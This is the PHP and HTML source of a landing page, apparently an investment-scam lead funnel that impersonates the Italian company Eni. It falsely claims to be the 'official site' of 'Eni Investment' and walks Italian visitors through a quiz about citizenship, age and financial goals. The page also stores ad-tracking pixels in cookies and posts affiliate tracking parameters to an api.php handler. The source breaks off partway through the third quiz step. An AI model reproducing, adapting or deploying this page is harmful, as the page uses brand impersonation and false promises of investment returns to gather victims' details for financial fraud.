<?php
$pixels = [ 'fb', 'fbe', 'ga', 'gad', 'mt', 'mtrk', 'tt', 'vk' ];
foreach ( $pixels as $px ) if (isset( $_GET[$px] )) {
	$z = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
	if ( $z ) setcookie( $px, $z, time() + 2592000, '/' );
}
?><!DOCTYPE html>
<html>

<head>
    <!-- 55 - 149  [o107;l3] eni-quiz -->
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
        PARTECIPA AL PROGETTO UFFICIALE DI ENI INVESTIMENT
    </title>
    <link type="image/x-icon" rel="shortcut icon" href="img/favicon.ico" />
    <link rel="stylesheet" href="css/app.css" />
    <link href="assets/landing/css/landing.css" rel="stylesheet" type="text/css">
<!--[HEADER]--></head>

<body>
    <div class="app-wrapper light-blue" style="
        --color: #ff183b;
        --color-lighten: #ff183b;
        --color-lighten10: #ff183b;
        --color-lighten2: #ff183b;
        --color-darken: #002d75;
        --color-darken10: #0041a8;
        --color-alpha: rgba(0, 84, 221, 0.5);
        --color-alpha2: rgba(0, 84, 221, 0.2);
        --color-alpha3: rgba(0, 84, 221, 0.05);
        --color-text: #ffffff;
        --color-text2: #0054dd;
        --gradient-main: 331deg, rgb(0, 45, 117), rgb(66, 139, 255);
        --color-primary-text-button: #fff;
        --color-bg-sidebar: #f7f7f7;
        --color-bg-1: #ededed;
        --color-bg-2: #e6e6e6;
        --color-bg-3: #cccccc;
        --color-bg-4: #b3b3b3;
        --color-bg-5: #999999;
        --color-bg-6: rgba(0, 0, 0, 0.7);
        --color-bg-7: #ededed;
        --color-bg-8: #d9d9d9;
        --color-bg-9: #363636;
        --color-bg-text: #000000;
        --color-bg-quiz: #ffffff;
        --color-bg-alpha0: rgba(255, 255, 255, 0);
        --color-bg-alpha2: rgba(0, 0, 0, 0.2);
        --color-bg-alpha7: rgba(0, 0, 0, 0.7);
        --color-white-label: #ffffff;
        width: 100%;
      ">
        <div id="app" class="app">
            <form class="layout" id="userPhoneForm" method="post" action="api.php?<?=http_build_query($_GET);?>" class="form main-screen__form" name="application"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=htmlspecialchars($_GET["uuid"]);?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=htmlspecialchars($_GET["fbclid"]);?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=htmlspecialchars($_GET["gclid"]);?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=htmlspecialchars($_GET["cpc"]);?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=htmlspecialchars($_GET["cur"]);?>" /><?php endif; ?>                <div class="app__start-page test-step active">
                    <div class="start-page columns is-desktop-modal start-page_has_bg start-page_position_right start-page_mode_start start-page_theme_expanded">
                        <img class="start-page__bg" src="img/enided.webp" alt="" />
                        <div class="start-page__content column is-5" style="z-index: 100">
                            <div class="start-page__body">
                                <div class="start-page__line"></div>
                                <h1 class="start-page__header">
                                    Quanto puoi guadagnare con gli investimenti?
                                </h1>
                                <h2 class="start-page__subheader">
                                    PARTECIPA AL PROGETTO UFFICIALE DI ENI INVESTIMENT
                                </h2>
                                <h2 class="start-page__subheader">
                                    E ACCEDI ALLA PIATTAFORMA DI TRADING DI!
                                </h2>
                                <button class="start-page__button button is-primary is-blicked has-light-shadow next-btn">
                                    <span class="icon">
                                        <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                            <title>mdi-checkbox-marked-circle-outline</title>
                                            <path d="M20,12C20,16.42 16.42,20 12,20C7.58,20 4,16.42 4,12C4,7.58 7.58,4 12,4C12.76,4 13.5,4.11 14.2,4.31L15.77,2.74C14.61,2.26 13.34,2 12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12M7.91,10.08L6.5,11.5L11,16L21,6L19.59,4.58L11,13.17L7.91,10.08Z" stroke-width="0" fill-rule="nonzero"></path>
                                        </svg>
                                    </span>
                                    &nbsp;Ottieni l'accesso
                                </button>
                                <p class="rre">
                                    <img style="max-width: 20px" src="img/galochka.webp" alt="">Sito ufficiale di <b>Eni Investment</b>
                                </p>
                            </div>
                        </div>
                        <div class="start-page__layer"></div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block">Sei un cittadino italiano?</span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="Sei un cittadino italiano?">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" style="" data-answer="Sì">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step1" value="Sì" />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">Sì</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" style="" data-answer="No">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step1" value="No" />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">No</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/flag.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 0 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block"> Qual è la tua età ? </span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="  Qual è la tua età ?">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" style="" data-answer="18-25">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step2" value="18-25 " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">18-25&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" style="" data-answer="25-35">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step2" value="25-35 " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">25-35&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" style="" data-answer="35-45">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step2" value="35-45 " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">35-45&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" style="" data-answer="45+">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step2" value="45+ " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">45+&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/krasn.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 1 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block">Il tuo obiettivo finanziario ?</span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="Il tuo obiettivo finanziario ?">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Provvedere a se stessi e alla famiglia">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step3" value="Provvedere a se stessi e alla famiglia " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Provvedere a se stessi e alla famiglia&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer='Crea un cuscino finanziario per un "giorno di pioggia"'>
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step3" value='Crea un cuscino finanziario per un "giorno di pioggia" ' />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Crea un cuscino finanziario per un "giorno di
                                                            pioggia"&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Abbellisci / acquista un alloggio personale">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step3" value="Abbellisci / acquista un alloggio personale " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Abbellisci / acquista un alloggio
                                                            personale&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Essere finanziariamente indipendenti">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step3" value="Essere finanziariamente indipendenti " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Essere finanziariamente indipendenti&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/piu.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 2 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
